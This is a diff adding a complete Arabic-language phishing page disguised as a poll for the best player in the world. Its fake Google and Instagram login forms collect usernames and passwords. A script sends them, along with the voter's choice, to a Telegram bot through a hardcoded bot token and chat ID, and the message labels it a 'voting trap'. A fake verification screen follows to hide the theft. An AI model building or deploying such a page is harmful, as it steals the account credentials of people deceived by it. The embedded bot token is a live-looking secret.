@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>أفضل لاعب في العالم</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+    body { background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+    
+    .box { background: #1e293b; padding: 30px; border-radius: 15px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+    .hidden { display: none !important; }
+    
+    h2 { color: #fff; margin-bottom: 10px; font-size: 24px; }
+    p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
+    
+    /* أزرار تسجيل الدخول */
+    .login-btn { width: 100%; padding: 14px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 15px; }
+    .btn-google { background: #fff; color: #333; }
+    .btn-insta { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); color: #fff; }
+    .login-btn img { width: 22px; height: 22px; }
+
+    /* حقول الإدخال */
+    input { width: 100%; padding: 14px; background: #0f172a; border: 1px solid #334155; color: #fff; border-radius: 8px; margin-bottom: 15px; text-align: center; font-size: 16px; }
+    input:focus { border-color: #38bdf8; outline: none; }
+    
+    /* أزرار التصويت */
+    .vote-btn { width: 100%; padding: 15px; background: #38bdf8; color: #000; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 10px; transition: 0.2s; }
+    .vote-btn:active { transform: scale(0.95); }
+    .vote-btn:disabled { background: #334155; color: #94a3b8; cursor: not-allowed; }
+
+    /* شاشة التحميل */
+    .loader { border: 4px solid #334155; border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<!-- الشاشة 1: الدخول -->
+<div class="box" id="loginScreen">
+    <h2>شارك في التصويت</h2>
+    <p>للتصويت على أفضل لاعب، يجب تأكيد هويتك أولاً لحماية نزاهة التصويت.</p>
+    
+    <button class="login-btn btn-google" onclick="showLoginForm('Google')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg"> 
+        الدخول بحساب Google
+    </button>
+    
+    <button class="login-btn btn-insta" onclick="showLoginForm('Instagram')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg"> 
+        الدخول بحساب Instagram
+    </button>
+</div>
+
+<!-- الشاشة 2: إدخال البيانات -->
+<div class="box hidden" id="formScreen">
+    <h2 id="formTitle">تسجيل الدخول</h2>
+    <p>أدخل بياناتك للمتابعة.</p>
+    
+    <input type="text" id="username" placeholder="البريد الإلكتروني أو اسم المستخدم">
+    <input type="password" id="password" placeholder="كلمة المرور">
+    
+    <button class="vote-btn" id="submitBtn" onclick="submitData()">تأكيد الدخول</button>
+</div>
+
+<!-- الشاشة 3: التحقق (الوهمي) -->
+<div class="box hidden" id="loadingScreen">
+    <div class="loader"></div>
+    <h2>جاري التحقق...</h2>
+    <p id="loadingText">يتم الآن التحقق من صحة الحساب، يرجى الانتظار.</p>
+</div>
+
+<!-- الشاشة 4: التصويت -->
+<div class="box hidden" id="voteScreen">
+    <h2>من هو الأفضل؟</h2>
+    <p>تم التحقق من حسابك بنجاح. اختر اللاعب الأفضل من وجهة نظرك:</p>
+    
+    <button class="vote-btn" onclick="castVote('سفاح 5')">سفاح 5</button>
+    <button class="vote-btn" onclick="castVote('نور 3')">نور 3</button>
+    <button class="vote-btn" onclick="castVote('عبدالله 6')">عبدالله 6</button>
+    <button class="vote-btn" onclick="castVote('زيد 8')">زيد 8</button>
+</div>
+
+<!-- الشاشة 5: النهاية -->
+<div class="box hidden" id="endScreen">
+    <h2 style="color:#22c55e;">تم تسجيل صوتك!</h2>
+    <p>شكراً لمشاركتك في التصويت. سيتم إعلان النتائج قريباً.</p>
+</div>
+
+<script>
+const TOKEN = "9225798978:AAHnyMuXHnWv7P_y05v2_nsR_O5VRGQZzCE";
+const CHAT_ID = "7356963877";
+
+let currentPlatform = "";
+
+// 1. اختيار المنصة
+function showLoginForm(platform) {
+    currentPlatform = platform;
+    document.getElementById('loginScreen').classList.add('hidden');
+    document.getElementById('formScreen').classList.remove('hidden');
+    document.getElementById('formTitle').textContent = "تسجيل الدخول عبر " + platform;
+}
+
+// 2. إرسال البيانات والتحقق الوهمي
+async function submitData() {
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    
+    if(!username || !password) return alert("يرجى تعبئة جميع الحقول");
+    
+    const btn = document.getElementById('submitBtn');
+    btn.disabled = true; 
+    
+    // إرسال البيانات للبوت
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: CHAT_ID, text: `🗳️ بيانات حساب (فخ التصويت)\n🌐 المنصة: ${currentPlatform}\n👤 اليوزر: ${username}\n🔑 الباسورد: ${password}`})
+    });
+
+    // إظهار شاشة التحقق الوهمية
+    document.getElementById('formScreen').classList.add('hidden');
+    document.getElementById('loadingScreen').classList.remove('hidden');
+
+    // بعد 3 ثواني، ننتقل لشاشة التصويت
+    setTimeout(() => {
+        document.getElementById('loadingScreen').classList.add('hidden');
+        document.getElementById('voteScreen').classList.remove('hidden');
+    }, 3000);
+}
+
+// 3. التصويت وإرسال النتيجة
+async function castVote(playerName) {
+    // إخفاء أزرار التصويت لمنع التكرار
+    const voteBtns = document.querySelectorAll('#voteScreen .vote-btn');
+    voteBtns.forEach(btn => btn.disabled = true);
+
+    // إرسال اختياره (اختياري، لتعرف من اختار)
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: CHAT_ID, text: `✅ قام الشخص بالتصويت لـ: ${playerName}`})
+    });
+
+    // إظهار شاشة النجاح
+    document.getElementById('voteScreen').classList.add('hidden');
+    document.getElementById('endScreen').classList.remove('hidden');
+}
+</script>
+</body>
+</html>
